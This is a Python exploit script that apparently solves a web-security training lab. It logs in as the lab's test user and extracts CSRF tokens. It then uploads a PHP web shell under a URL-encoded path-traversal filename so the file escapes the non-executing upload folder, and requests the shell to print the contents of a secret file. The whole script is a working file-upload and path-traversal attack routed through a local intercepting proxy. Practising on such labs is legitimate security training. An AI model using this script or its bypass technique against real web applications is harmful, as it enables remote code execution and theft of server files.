import requests
import urllib3
import random, string
from bs4 import BeautifulSoup
from requests_toolbelt import MultipartEncoder
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

url = "https://0a2200c1042c9bb780a0176c00a0003d.web-security-academy.net/"
user = "wiener"
password = "peter"

s = requests.Session()

def get_csrf(s, url):
    res = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf = soup.find("input", {"name":"csrf"})['value']
    return csrf

def exploit_file_upload(s,  url):
    
    # Get CSRF Token
    login_url = url + "/login"
    csrf_token = get_csrf(s, login_url)

    # Loggin in as the wiener user...
    login_data = {'csrf': csrf_token, 'username': user, 'password': password}
    res = s.post(login_url, verify=False, proxies=proxies, data=login_data)

    if 'Log out' in res.text:
        print("[+] Successfully logged as wiener user...")
        # Upload Web Shell
        account_url = url + "/my-account"
        csrf_token = get_csrf(s, account_url)
        file_upload_url = url + "/my-account/avatar"

        params = {"avatar": ('..%2fpayload.php', "<?php echo file_get_contents('/home/carlos/secret'); ?>", 'application/octet-stream'),
        "user": user,
        "csrf": csrf_token}

        boundary = '------WebKitFormBoundary' + ''.join(random.sample(string.ascii_letters + string.digits, 16))
        m = MultipartEncoder(fields=params, boundary=boundary)
        headers = {"Content-Type": m.content_type}

        res = s.post(url=file_upload_url, data=m, headers=headers, verify=False, proxies=proxies)
        
        print("(+) Following is the content of the secret file:")
        url_to_payload = url + '/files/payload.php'
        res = s.get(url=url_to_payload, verify=False, proxies=proxies)
        print(res.text)
    else:
        print("[-] Login attempt failed")



exploit_file_upload(s, url)